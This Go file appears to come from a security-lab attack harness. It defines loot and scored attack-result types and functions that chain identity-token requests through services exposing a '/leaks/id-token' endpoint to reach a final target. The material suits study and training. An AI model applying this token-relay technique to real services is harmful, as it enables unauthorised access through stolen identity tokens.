package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

type Loot struct {
	Key  string `json:"key"`
	Data string `json:"data"`
}

type AttackResult struct {
	Points      int    `json:"points"`
	Explanation string `json:"explanation"`
	Loot        []Loot `json:"loot,omitempty"`
	Log         string `json:"log,omitempty"`
}

func GetChainedToken(services []string, target string) (string, error) {
	if len(services) == 0 {
		return "", nil
	}
	idToken := ""
	for i := 0; i < len(services)-1; i += 1 {
		tgt := fmt.Sprintf("%s/leaks/id-token", services[i+1])
		var err error
		idToken, err = GetServiceIdToken(services[i], tgt, idToken)
		if err != nil {
			return "", fmt.Errorf("could not get token from %s for %s: %s", services[i], tgt, err)
		}
	}
	last := services[len(services)-1]
	return GetServiceIdToken(last, target, idToken)
}

func GetServiceIdToken(service, target, token string) (string, error) {
	url := service + "/leaks/id-token?url=" + target
	resp, err := GetWithAuth(url, token)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("unexpected return code calling %s: %v", url, resp.StatusCode)
	}
	idToken, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(idToken), nil
}
